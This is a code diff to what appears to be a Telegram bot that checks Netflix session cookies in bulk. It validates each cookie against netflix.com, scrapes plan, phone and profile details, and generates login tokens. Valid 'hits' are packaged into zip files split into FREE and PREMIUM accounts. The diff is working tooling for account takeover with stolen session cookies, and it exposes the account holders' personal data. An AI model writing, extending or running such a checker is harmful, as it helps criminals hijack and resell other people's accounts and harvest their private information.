@@ -681,9 +681,36 @@ class NetflixChecker:
             max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
             if not max_streams:
                 max_streams = find(r'"maxStreams"\s*:\s*(\d+)')
-            info["max_streams"] = max_streams if max_streams else "Unknown"
+            if not max_streams:
+                max_streams = find(r'"numOfAllowedStreams"\s*:\s*(\d+)')
 
             video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
+            if not video_quality:
+                video_quality = find(r'"videoQuality"\s*:\s*"([^"]+)"')
+            if not video_quality:
+                video_quality = find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
+
+            plan_name_lower = (info.get("plan") or "").lower()
+            if not max_streams or max_streams == "Unknown":
+                if "premium" in plan_name_lower:
+                    max_streams = "4"
+                elif "standard" in plan_name_lower:
+                    max_streams = "2"
+                elif "basic" in plan_name_lower:
+                    max_streams = "1"
+                elif "mobile" in plan_name_lower:
+                    max_streams = "1"
+            if not video_quality or video_quality == "Unknown":
+                if "premium" in plan_name_lower:
+                    video_quality = "Ultra HD"
+                elif "standard" in plan_name_lower:
+                    video_quality = "Full HD"
+                elif "basic" in plan_name_lower:
+                    video_quality = "HD"
+                elif "mobile" in plan_name_lower:
+                    video_quality = "SD"
+
+            info["max_streams"] = max_streams if max_streams else "Unknown"
             info["video_quality"] = video_quality if video_quality else "Unknown"
 
             phone_verified_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"isVerified":(true|false)', body, re.DOTALL)
@@ -714,21 +741,49 @@ class NetflixChecker:
                 info["extra_members"] = extra_match.group(1) if extra_match else "No"
 
             add_on_slots_match = re.search(r'"addOnSlots":\s*\{[^}]*"value":\s*\[\s*\{\s*"fieldType":\s*"Group",\s*"fieldGroup":\s*"AddOnSlot",\s*"fields":\s*\{\s*"slotState":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"', body, re.DOTALL)
-            info["extra_member_slot_status"] = add_on_slots_match.group(1) if add_on_slots_match else "Unknown"
-
-            try:
-                profiles_resp = session.get("https://www.netflix.com/ManageProfiles", headers=headers, timeout=10)
-                profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_resp.text)
-                if profile_names:
-                    decoded = [self._unescape_netflix(p) for p in profile_names]
-                    info["profiles"] = ", ".join(decoded)
-                    info["connected_profiles"] = str(len(decoded))
+            if add_on_slots_match:
+                info["extra_member_slot_status"] = add_on_slots_match.group(1)
+            else:
+                slot_alt = find(r'"slotState"\s*:\s*"([^"]+)"')
+                if slot_alt:
+                    info["extra_member_slot_status"] = slot_alt
+                elif info.get("extra_members") == "Yes":
+                    info["extra_member_slot_status"] = "Available"
+                elif info.get("extra_members") == "No":
+                    info["extra_member_slot_status"] = "N/A"
                 else:
-                    info["profiles"] = "Unknown"
-                    info["connected_profiles"] = "Unknown"
-            except Exception:
-                info["profiles"] = "Unknown"
-                info["connected_profiles"] = "Unknown"
+                    info["extra_member_slot_status"] = "N/A"
+
+            profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', body)
+            if not profile_names:
+                profile_names = re.findall(r'"firstName"\s*:\s*"([^"]+)"', body)
+            if profile_names:
+                decoded = [self._unescape_netflix(p) for p in profile_names]
+                seen = []
+                for d in decoded:
+                    if d not in seen:
+                        seen.append(d)
+                info["profiles"] = ", ".join(seen)
+                info["connected_profiles"] = str(len(seen))
+            else:
+                try:
+                    proxies = self.session.proxies if self.session.proxies else None
+                    profiles_resp = requests.get("https://www.netflix.com/ManageProfiles", headers=headers, cookies=cookie_dict, timeout=req_timeout, allow_redirects=True, proxies=proxies)
+                    pnames = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_resp.text)
+                    if pnames:
+                        decoded = [self._unescape_netflix(p) for p in pnames]
+                        seen = []
+                        for d in decoded:
+                            if d not in seen:
+                                seen.append(d)
+                        info["profiles"] = ", ".join(seen)
+                        info["connected_profiles"] = str(len(seen))
+                    else:
+                        info["profiles"] = "N/A"
+                        info["connected_profiles"] = "N/A"
+                except Exception:
+                    info["profiles"] = "N/A"
+                    info["connected_profiles"] = "N/A"
 
             if info["phone"] and info["phone"] != "N/A":
                 phone_digits = re.sub(r'[^\d]', '', info["phone"])
@@ -1143,14 +1198,14 @@ def check_and_generate(cookie_line, source_label, use_html=False):
     try:
         cookies = checker.load_cookies(cookie_line)
         if not cookies:
-            return None, "Invalid/empty cookie string"
+            return None, "Invalid/empty cookie string", None
         account_info = checker.check_account(cookies)
         token_gen.stats["checks_done"] += 1
         if account_info.get('status') != 'success':
             status = account_info.get('status', 'failure')
             msg = account_info.get('message', '')
             membership = account_info.get('membership_status', '')
-            return None, f"Status: {status} | {membership} | {msg}"
+            return None, f"Status: {status} | {membership} | {msg}", None
         token_gen.stats["hits"] += 1
         login_url = "N/A"
         android_login_url = "N/A"
@@ -1166,11 +1221,13 @@ def check_and_generate(cookie_line, source_label, use_html=False):
         except Exception as te:
             logger.warning(f"Token gen exception but account valid: {te}")
         formatted = format_full_result(source_label, account_info, login_url, cookie_line, android_login_url, use_html=use_html)
-        return formatted, None
+        on_hold = account_info.get('on_hold', 'Unknown')
+        is_free = on_hold in ("Yes", "yes", "true", True)
+        return formatted, None, "FREE" if is_free else "PREMIUM"
     except Exception as e:
         logger.error(f"check_and_generate error: {e}")
         token_gen.stats["errors"] += 1
-        return None, f"Error: {str(e)[:100]}"
+        return None, f"Error: {str(e)[:100]}", None
 
 
 def parse_cookie_file_content(content):
@@ -2677,7 +2734,7 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(lines) == 1:
         processing_msg = await message.reply_text("\U0001f50e Checking cookie & generating token...", parse_mode=ParseMode.HTML)
         loop = asyncio.get_event_loop()
-        result, err = await loop.run_in_executor(thread_pool, check_and_generate, lines[0], source_label, True)
+        result, err, _acct_type = await loop.run_in_executor(thread_pool, check_and_generate, lines[0], source_label, True)
         if result:
             await processing_msg.edit_text(result, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
         else:
@@ -2944,8 +3001,8 @@ async def process_batch_check_async(bot, message, cookies, source_name, file_siz
         if stop_flags.get(user_id, {}).get("action") in ["stop", "cancel"]:
             return None
         label = f"{source_name}_cookie_{i + 1}"
-        result, err = check_and_generate(cookie_line, label)
-        return (i, result, err)
+        result, err, acct_type = check_and_generate(cookie_line, label)
+        return (i, result, err, acct_type)
 
     async def update_progress(force=False):
         processed = batch_tasks[task_id].get("processed", 0)
@@ -3005,12 +3062,12 @@ async def process_batch_check_async(bot, message, cookies, source_name, file_siz
                 for coro in done:
                     result_tuple = coro.result()
                     if result_tuple:
-                        i, result, err = result_tuple
+                        i, result, err, acct_type = result_tuple
                         async with results_lock:
                             batch_tasks[task_id]["processed"] += 1
                             if result:
                                 batch_tasks[task_id]["hits"] += 1
-                                all_results.append(result)
+                                all_results.append((result, acct_type))
                             elif err and ('Timeout' in str(err) or 'Network' in str(err) or 'Error:' in str(err) or 'HTTP 5' in str(err) or 'HTTP 429' in str(err) or 'Connection' in str(err)):
                                 batch_tasks[task_id]["errors"] += 1
                                 batch_tasks[task_id]["failed"] += 1
@@ -3035,11 +3092,38 @@ async def process_batch_check_async(bot, message, cookies, source_name, file_siz
 
         hits = batch_tasks[task_id]["hits"]
         if hits > 0 and save:
-            res_list = [f"HIT #{i+1}\n{r}" for i, r in enumerate(all_results)]
-            file_content = f"Netflix Results\nHits: {hits}\n\n" + "\n\n".join(res_list)
-            file_obj = io.BytesIO(file_content.encode('utf-8', errors='replace'))
-            file_obj.name = f"{hits}X_Netflix_Results.txt"
-            await bot.send_document(message.chat_id, document=file_obj, reply_to_message_id=message.message_id)
+            free_results = []
+            premium_results = []
+            for r, atype in all_results:
+                if atype == "FREE":
+                    free_results.append(r)
+                else:
+                    premium_results.append(r)
+
+            import zipfile as zf_mod
+            zip_buffer = io.BytesIO()
+            with zf_mod.ZipFile(zip_buffer, 'w', zf_mod.ZIP_DEFLATED) as zf:
+                if free_results:
+                    free_list = [f"HIT #{i+1}\n{r}" for i, r in enumerate(free_results)]
+                    free_content = f"Netflix FREE Account Results\nHits: {len(free_results)}\n\n" + "\n\n".join(free_list)
+                    zf.writestr(f"{len(free_results)}X_FREE_Results.txt", free_content.encode('utf-8', errors='replace'))
+                if premium_results:
+                    prem_list = [f"HIT #{i+1}\n{r}" for i, r in enumerate(premium_results)]
+                    prem_content = f"Netflix PREMIUM Account Results\nHits: {len(premium_results)}\n\n" + "\n\n".join(prem_list)
+                    zf.writestr(f"{len(premium_results)}X_PREMIUM_Results.txt", prem_content.encode('utf-8', errors='replace'))
+                all_list = [f"HIT #{i+1}\n{r}" for i, (r, _) in enumerate(all_results)]
+                all_content = f"Netflix All Results\nTotal Hits: {hits} (FREE: {len(free_results)} | PREMIUM: {len(premium_results)})\n\n" + "\n\n".join(all_list)
+                zf.writestr(f"{hits}X_All_Results.txt", all_content.encode('utf-8', errors='replace'))
+
+            zip_buffer.seek(0)
+            zip_buffer.name = f"{hits}X_Netflix_Results.zip"
+            summary = (
+                f"\u2705 <b>Batch Complete</b>\n\n"
+                f"\U0001f4e6 Total Hits: {hits}\n"
+                f"\u2705 FREE: {len(free_results)}\n"
+                f"\U0001f48e PREMIUM: {len(premium_results)}"
+            )
+            await bot.send_document(message.chat_id, document=zip_buffer, caption=summary, parse_mode=ParseMode.HTML, reply_to_message_id=message.message_id)
     finally:
         batch_tasks[task_id]["active"] = False
         watchdog_task.cancel()
@@ -3269,12 +3353,12 @@ async def process_zip_file_async(bot, message, zip_bytes, zip_name):
         label = f"{base_name}_cookie_{i + 1}"
         logger.info(f"[ZIP-BATCH] Worker starting cookie #{i+1}/{total}: {label}")
         try:
-            result, err = check_and_generate(cookie_line, label)
+            result, err, acct_type = check_and_generate(cookie_line, label)
             logger.info(f"[ZIP-BATCH] Cookie #{i+1} done: {'HIT' if result else 'FAIL'} err={err}")
-            return (i, src_file, result, err)
+            return (i, src_file, result, err, acct_type)
         except Exception as e:
             logger.error(f"[ZIP-BATCH] Cookie #{i+1} exception: {e}")
-            return (i, src_file, None, str(e))
+            return (i, src_file, None, str(e), None)
 
     async def update_progress(force=False):
         processed = batch_tasks[task_id]["processed"]
@@ -3353,12 +3437,12 @@ async def process_zip_file_async(bot, message, zip_bytes, zip_name):
                 for coro in done:
                     result_tuple = coro.result()
                     if result_tuple:
-                        i, src_file, result, err = result_tuple
+                        i, src_file, result, err, acct_type = result_tuple
                         async with results_lock:
                             batch_tasks[task_id]["processed"] += 1
                             if result:
                                 batch_tasks[task_id]["hits"] += 1
-                                all_results.append((src_file, result))
+                                all_results.append((src_file, result, acct_type))
                                 batch_tasks[task_id]["results"].append(result)
                             elif err and ('Timeout' in str(err) or 'Network' in str(err) or 'Error:' in str(err) or 'HTTP 5' in str(err) or 'HTTP 429' in str(err) or 'Connection' in str(err)):
                                 batch_tasks[task_id]["errors"] += 1
@@ -3413,35 +3497,41 @@ async def process_zip_file_async(bot, message, zip_bytes, zip_name):
             pass
 
     if hits > 0 and save:
+        free_results = [(sf, r) for sf, r, at in all_results if at == "FREE"]
+        premium_results = [(sf, r) for sf, r, at in all_results if at != "FREE"]
+
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as result_zip:
             combined_content = f"Netflix Checker + Token Results\n{'=' * 60}\n"
             combined_content += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
             combined_content += f"Source: {zip_name}\n"
-            combined_content += f"Total Hits: {hits}\n{'=' * 60}\n\n"
-            for idx, (src_file, r) in enumerate(all_results, 1):
+            combined_content += f"Total Hits: {hits} (FREE: {len(free_results)} | PREMIUM: {len(premium_results)})\n{'=' * 60}\n\n"
+            for idx, (src_file, r, _at) in enumerate(all_results, 1):
                 combined_content += f"{'=' * 40} HIT #{idx} ({os.path.basename(src_file)}) {'=' * 40}\n{r}\n\n"
-            result_zip.writestr(f"{hits}X NetflixCookies @XD_HR.txt", combined_content.encode('utf-8', errors='replace'))
+            result_zip.writestr(f"{hits}X_All_Results.txt", combined_content.encode('utf-8', errors='replace'))
 
-            file_results = {}
-            for src_file, r in all_results:
-                if src_file not in file_results:
-                    file_results[src_file] = []
-                file_results[src_file].append(r)
+            if free_results:
+                free_content = f"Netflix FREE Account Results\n{'=' * 60}\nHits: {len(free_results)}\n{'=' * 60}\n\n"
+                for idx, (sf, r) in enumerate(free_results, 1):
+                    free_content += f"{'=' * 40} HIT #{idx} ({os.path.basename(sf)}) {'=' * 40}\n{r}\n\n"
+                result_zip.writestr(f"{len(free_results)}X_FREE_Results.txt", free_content.encode('utf-8', errors='replace'))
 
-            for src_file, results in file_results.items():
-                base = os.path.basename(src_file).replace('.txt', '')
-                file_content = f"Results for: {src_file}\n{'=' * 60}\n"
-                file_content += f"Hits: {len(results)}\n{'=' * 60}\n\n"
-                for idx, r in enumerate(results, 1):
-                    file_content += f"{'=' * 40} HIT #{idx} {'=' * 40}\n{r}\n\n"
-                result_zip.writestr(f"per_file/{base}_results.txt", file_content.encode('utf-8', errors='replace'))
+            if premium_results:
+                prem_content = f"Netflix PREMIUM Account Results\n{'=' * 60}\nHits: {len(premium_results)}\n{'=' * 60}\n\n"
+                for idx, (sf, r) in enumerate(premium_results, 1):
+                    prem_content += f"{'=' * 40} HIT #{idx} ({os.path.basename(sf)}) {'=' * 40}\n{r}\n\n"
+                result_zip.writestr(f"{len(premium_results)}X_PREMIUM_Results.txt", prem_content.encode('utf-8', errors='replace'))
 
         zip_buffer.seek(0)
         zip_buffer.name = f"{hits}X NetflixCookies @XD_HR.zip"
+        summary = (
+            f"\U0001f4e6 <b>{hits} hits from {total_files} files</b>\n"
+            f"\u2705 FREE: {len(free_results)}\n"
+            f"\U0001f48e PREMIUM: {len(premium_results)}"
+        )
         await bot.send_document(
             message.chat_id, document=zip_buffer, reply_to_message_id=message.message_id,
-            caption=f"\U0001f4e6 {hits} hits from {total_files} files saved"
+            caption=summary, parse_mode=ParseMode.HTML
         )
     elif hits == 0 and action != "cancel":
         await message.reply_text("\u274c No valid hits found in this zip batch.", parse_mode=ParseMode.HTML)
